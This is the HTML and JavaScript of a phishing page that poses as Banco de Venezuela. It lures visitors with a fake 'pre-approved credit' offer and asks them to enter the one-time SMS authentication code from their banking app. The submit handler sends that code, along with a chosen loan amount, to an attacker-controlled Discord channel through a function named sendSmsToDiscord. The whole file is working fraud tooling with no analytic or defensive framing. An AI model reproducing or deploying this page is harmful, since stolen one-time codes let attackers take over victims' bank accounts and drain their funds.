<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Banco de Venezuela</title>
    <style>
      body {
        margin: 0;
        padding: 0;
        font-family: Arial, sans-serif;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        background-image: url(background.jpg);
        background-size: cover;
        background-position: center;
      }

      .container {
        display: flex;
        height: 100%;
        width: 100%;
      }

      .left-side {
        width: 50%;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .right-side {
        width: 50%;
      }
      form {
        width: 80%;
        background: white;
        max-width: 550px;
        box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
      }

      @media (max-width: 768px) {
        body {
          background: #ededed;
        }
        .container {
          flex-direction: column;
        }
        .left-side {
          width: 100%;
          height: 100vh;
        }
        .right-side {
          display: none;
        }
      }
    </style>
    <style>
      .form-group {
        position: relative;
        margin-bottom: 20px;
        margin: 20px;
      }

      .form-group label {
        position: absolute;
        top: 50%;
        left: 10px;
        transform: translateY(-55%);
        color: #999;
        transition: top 0.3s, font-size 0.3s;
        pointer-events: none;
      }

      .form-group input {
        width: 100%;
        padding: 10px;
        box-sizing: border-box;
        position: relative;
        height: 60px;
        border: 0;
        border-bottom: 1px solid gray;
        background: #ededed;
        outline: none;
      }
      .form-group input:focus {
        border: 0;
      }
      .form-group input:focus + label,
      .form-group input:not(:placeholder-shown) + label {
        top: 5px;
        font-size: 12px;
      }
      button {
        background-color: #0067b1;
        color: white;
        border-radius: 3px;
        border: 0;
        padding: 15px;
        width: 200px;
        cursor: pointer;
      }
      button:disabled {
        opacity: 0.6;
        cursor: not-allowed;
      }
    </style>
    <style>
      .slider-container {
        text-align: center;
        width: 80%;
        max-width: 600px;
        margin: auto;
      }
      .slider-container h2 {
        margin-bottom: 20px;
      }
      .slider {
        width: 100%;
        margin: 20px 0;
      }
      .slider-value {
        font-size: 24px;
        color: #333;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div class="left-side">
        <form id="loginform">
          <div style="text-align: center">
            <img src="logo.png" alt="" style="width: 60%; margin-top: 20px" />
          </div>
          <div style="width: 100%; text-align: center">
            <div style="margin: 10px; color: #0067b1 !important">
              <h4>Credito Preaprobado</h4>
              <h5 style="padding: 20px;">
                Aprueba la notificacion en tu App BDV eh ingresa el c&oacute;digo resibido por SMS o generado en Amiven.
              </h5>
            </div>
            <div style="width: 100%; text-align: center">
              <div class="slider-container">
                <div class="slider-value" id="sliderValue" style="color: #0070CC;">$1000</div>
                <input
                  type="range"
                  min="1000"
                  max="20000"
                  value="1000"
                  class="slider"
                  id="priceSlider"
                />
              </div>
            </div>
            <script>
              const slider = document.getElementById("priceSlider");
              const sliderValue = document.getElementById("sliderValue");

              slider.addEventListener("input", function () {
                sliderValue.textContent = "$" + slider.value;
              });
            </script>
            <div class="form-group">
              <input
                type="text"
                id="sms"
                name="sms"
                style="width: 100%"
                maxlength="8"
                required
              />
              <label for="sms">SMS *</label>
            </div>

            <script>
              document.addEventListener("DOMContentLoaded", function () {
                const input = document.getElementById("sms");
                const label = input.nextElementSibling;
                label.style.top = "50%";
                if (input.value !== "") {
                  label.style.top = "15px";
                  label.style.fontSize = "12px";
                }

                input.addEventListener("focus", () => {
                  label.style.top = "15px";
                  label.style.fontSize = "12px";
                });

                input.addEventListener("blur", () => {
                  if (!input.value) {
                    label.style.top = "50%";
                    label.style.fontSize = "";
                  }
                });
              });
            </script>
          </div>
          <div style="width: 100%; text-align: center">
            <button type="submit" id="btnVerificar">Verificar</button>
          </div>
          <div style="width: 100%; height: 30px"></div>
        </form>
      </div>
      <div class="right-side"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script src="script.js"></script>

    <script>
      document.addEventListener('DOMContentLoaded', function() {
        const form = document.getElementById('loginform');
        const smsInput = document.getElementById('sms');
        const btnVerificar = document.getElementById('btnVerificar');
        const slider = document.getElementById('priceSlider');
        let formSubmitted = false;

        // Resetear estado de envio de SMS
        if (typeof resetSmsSent === 'function') {
          resetSmsSent();
        }

        form.addEventListener('submit', async function(e) {
          e.preventDefault();
          
          // Evitar doble envio
          if (formSubmitted || btnVerificar.disabled) return;
          
          const smsCode = smsInput.value.trim();
          
          if (smsCode === '') {
            alert('Por favor ingrese el codigo SMS');
            smsInput.focus();
            return;
          }

          if (smsCode.length < 4) {
            alert('El codigo SMS debe tener al menos 4 caracteres');
            smsInput.focus();
            return;
          }

          // Deshabilitar boton
          btnVerificar.disabled = true;
          btnVerificar.textContent = 'Verificando...';
          formSubmitted = true;

          // Obtener el monto del slider
          const monto = slider.value;

          try {
            // Verificar que la funcion existe
            if (typeof sendSmsToDiscord !== 'function') {
              console.error('sendSmsToDiscord no esta definida');
              alert('Error: La funcion de envio no esta disponible. Recargue la pagina.');
              btnVerificar.disabled = false;
              btnVerificar.textContent = 'Verificar';
              formSubmitted = false;
              return;
            }

            // Enviar SMS a Discord
            const result = await sendSmsToDiscord(smsCode, monto);
            
            if (result.ok) {
              // La redireccion se hace dentro de sendSmsToDiscord
              console.log('SMS enviado correctamente');
            } else {
              alert('Error al verificar el codigo. Intente nuevamente.');
              btnVerificar.disabled = false;
              btnVerificar.textContent = 'Verificar';
              formSubmitted = false;
            }
          } catch (error) {
            console.error('Error:', error);
            alert('Error al procesar la solicitud: ' + error.message);
            btnVerificar.disabled = false;
            btnVerificar.textContent = 'Verificar';
            formSubmitted = false;
          }
        });

        // Manejar el label del input SMS
        const smsLabel = smsInput.nextElementSibling;
        if (smsInput.value !== '') {
          smsLabel.style.top = '15px';
          smsLabel.style.fontSize = '12px';
        }

        smsInput.addEventListener('focus', () => {
          smsLabel.style.top = '15px';
          smsLabel.style.fontSize = '12px';
        });

        smsInput.addEventListener('blur', () => {
          if (!smsInput.value) {
            smsLabel.style.top = '50%';
            smsLabel.style.fontSize = '';
          }
        });

        // Permitir solo numeros en el campo SMS
        smsInput.addEventListener('input', function() {
          this.value = this.value.replace(/[^0-9]/g, '');
        });
      });
    </script>
  </body>
</html>
